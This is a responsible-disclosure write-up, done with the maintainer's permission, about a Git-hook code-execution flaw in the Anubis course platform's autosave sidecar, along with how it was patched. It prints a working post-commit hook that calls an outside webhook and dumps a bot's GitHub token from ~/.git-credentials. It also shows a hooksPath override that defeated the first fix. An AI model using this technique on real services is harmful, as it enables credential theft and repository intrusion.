<preview>
#### Abusing Anubis Autosave to Break into Student GitHub Repositories

In this writeup, I’ll be presenting an interesting vulnerability I found that enables an attacker to abuse the assignment autosave functionality to leak sensitive tokens and configurations from an otherwise inaccessible container. An attacker can then use these sensitive tokens to break into the class’s GitHub organization to break into other students’ and faculty’s repositories, and potentially access other sensitive Anubis resources.
</preview>

#### How Anubis Autosave Works

When you boot into Anubis’s [Theia IDE](https://theia-ide.org), you’re interacting with a provisioned Docker container created just for you. From here, you have the opportunity to access a Linux shell inside to build and debug programs for your assignments. One neat feature that has been introduced is the ability to *autosave*, which can be done inside the assignment repository with the following command:

```graphql
$ anubis autosave
```

Once this command is executed, it [calls an HTTP API endpoint](https://github.com/AnubisLMS/Anubis/blob/118f70faccd4ebceb8df4b492469473c7f978396/theia/ide/theia-base/cli/anubis/cli.py#L196-L200) at [http://localhost:5001/](http://localhost:5001/), which actually lives on a *separate container,* but is able to access a shared volume with your IDE container that contains only your assignment repository. When called, this API service then automatically runs Git commands on the repo as `anubis-robot` to commit and push any new changes to the class GitHub to automatically save your progress:

![Untitled](Abusing%20Anubis%20Autosave%20to%20Break%20into%20Student%20GitH%206b539a62cf104f60bb378034ed27b546/Untitled.png)

Having this “sidecar” container is very important: it decouples sensitive functionality from the unprivileged student-facing IDE container. In this instance, having this design pattern means that students are not able to execute Git operations as `anubis-robot`, whose credentials live entirely in the sidecar container in its `~/.git-credentials` path and has Git access to every student and faculty’s codebases in the organization. Thus, the students must make changes, and then run the `anubis autosave` command to interact with your codebase over the shared volume, which will only strictly commit and push to GitHub. Once done, we see the tool spit out some Git output, which was originally from the remote service:

![Untitled](Abusing%20Anubis%20Autosave%20to%20Break%20into%20Student%20GitH%206b539a62cf104f60bb378034ed27b546/Untitled%201.png)

However, what if there is a way we can make this autosave functionality also spill out `anubis-robot`'s credentials for us to gain privileged access to the `os3224` organization? Even worst, what if we can also arbitrarily run *any* malicious command in the sidecar container itself?

#### The Vulnerability

The vulnerability I found is actually quite trivial, but it does require a bit of background knowledge on some of Git’s obscure yet interesting features. For our exploit, we’ll be relying on [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks). Git Hooks allows you to write scripts that live in the `.git/hooks` folder in your repository that can arbitrarily execute commands or code before or after you run a Git operation, such as pushing. For instance, a developer can write a Git Hook that automates the deployment of their code to a cloud service or CI/CD when `git push` is run, and then actually push the changes upstream. Keep in mind that Git hook scripts you write exist *only locally*, so it’s not possible for an attacker to write a hook script that drops malware, and then push it to GitHub for other users to clone down.

When realizing how the IDE interacts with the sidecar, and the fact that the `.git` folder itself is also exposed in the shared volume, I immediately wrote a `pre-commit` hook that executes some code on the sidecar container once the service runs `git commit`.

First, I created a `.git/hooks/pre-commit` file in my assignment repository and marked it as executable with `chmod +x .git/hooks/pre-commit`. Inside it, I wrote a simple Python script, as it is supported by Git hooks with the proper `#!/usr/bin/env python3` shebang, and the fact that the sidecar service lives on a container with a [Python image](https://github.com/AnubisLMS/Anubis/blob/118f70faccd4ebceb8df4b492469473c7f978396/theia/sidecar/Dockerfile#L1):

```python
#!/usr/bin/env python3
import os
import urllib.request

# lets us know in the stdout we get back we've succeeded!
print("Pwned!")

# this just pings a random testing `https://webhook.site` URL to show we're alive.
# we could pip install requests, but `urllib` gives us `urllib.request` for free
urllib.request.urlopen("http://<WEBHOOK_URL>")

# dump `anubis-robot`s credential (not the best way to get the path, but whatever)
with open(os.getenv("HOME") + "/" + ".git-credentials", "r") as fd:
	print(fd.read())
```

I ran `anubis autosave` after making some random repo changes and braced for success... but nothing happened. 

It turns out that the Anubis team is pretty security-conscious, and they’ve actually taken a very good step to mitigate this type of vulnerability, by having the service run `git commit --no-verify`, which [prevents pre-hooks from executing](https://github.com/AnubisLMS/Anubis/blob/118f70faccd4ebceb8df4b492469473c7f978396/theia/sidecar/app.py#L62).

**However**, after digging a little further into Git documentation, it turns out that `--no-verify` does not stop *post*-hooks! We go back and change the script to `post-commit`, run `anubis autosave` and...

![Screen Shot 2022-02-01 at 2.17.14 AM.png](Abusing%20Anubis%20Autosave%20to%20Break%20into%20Student%20GitH%206b539a62cf104f60bb378034ed27b546/Screen_Shot_2022-02-01_at_2.17.14_AM.png)

Success! We now have access to `anubis-robot`'s username and password token pair! Judging by the `ghp_*` prefix in the API token, we now have stolen a personal access token. **If I was feeling evil, I can now use this to access any student’s (and potentially faculty’s) private repositories just through the GitHub API.**

We can even go a step further and dump out all the sensitive environment variables to see what other cloud resource endpoints we could potentially abuse as an attacker:

![Screen Shot 2022-02-01 at 2.31.58 AM.png](Abusing%20Anubis%20Autosave%20to%20Break%20into%20Student%20GitH%206b539a62cf104f60bb378034ed27b546/Screen_Shot_2022-02-01_at_2.31.58_AM.png)

This is of course blurred out because there is quite a bit of sensitive variables being set that shouldn’t be exposed to the student, such as the Kubernetes service API, which we could abuse with the `/run/secrets/kubernetes.io/serviceaccount/token` JWT token stored in the container to potentially enumerate and mess with sensitive resources that also exist in the Anubis infrastructure. Unfortunately, this didn’t work on my end, but was worth a shot.

#### Remediation

During the process of discovering this vulnerability, I kept in contact with John, and immediately reported this attack vector, which he patched almost instantaneously. The GitHub credentials were rotated, and a mitigation was pushed up that prevented Git hooks. This patch basically introduced a *global* change where Git hooks are basically disabled from ever running:

```yaml
[code]
hooksPath = /dev/null
```

However, given Git’s annoyingly complex features, this initial mitigation didn’t work. To override *global* Git configurations, all we have to do is to create a *local* one in the assignment repository either through `.git/config` or creating a `.gitconfig` file with the contents:

```yaml
[core]
hooksPath = "githooks/hooks"
```

.. and then create a directory in the repository called `githooks/hooks`, drop our malicious Git `post-commit` hook, and we can still exploit!

After spending some time sifting through Git’s documentation to determine conditions that can still lead to arbitrary code execution, a more bulletproof patch has since been integrated, which can be seen in [this commit here](https://github.com/AnubisLMS/Anubis/commit/72dc0233049e0b82f90e67d715c8bbc435509815), where each `git` operation now prevents *any* Git hook and clever aliasing to run. Other potential changes to restricting access pre- and post-exploitation are also being planned.

#### Conclusion

Despite the existence of this, it’s still important to mention this vulnerability didn’t exist because of poor implementation, but rather pesky obscure behaviors that can be abused in a dependent software component. After dedicating some time auditing the platform, Anubis is still very well secure and upholds incredibly strong design principles, which I’ll lay out here:

- Open Sourced

By remaining open-sourced, Anubis not only enables community collaboration, but also auditability of their codebase, as it enables well-intentioned hackers to quickly pinpoint and remediate severe bugs that can be exploited. For instance, having access to both documentation written by the team and infrastructure code [here](https://github.com/AnubisLMS/Anubis/blob/master/theia/sidecar/Dockerfile#L15) enabled me to quickly realize that the autosave functionality actually operates on a shared volume per assignment.

- Security Advocacy

Some members of the Anubis team have a strong security background. This means they not only thought about the attack surface during implementation and enforced strong access controls, but also encouraged others to responsibly attack and disclose vulnerabilities. Encouraging others  to do this to ultimately improve your software’s security posture is very positive shift in the industry security, yet still not widely adapted.

Overall this was a fun challenge to pull off, and was happy to pick up a few extra tricks for container and Kubernetes (ethical) hacking. Huge shoutout to John for giving permission to do this, and to bounce off questions about the design of the infrastructure!
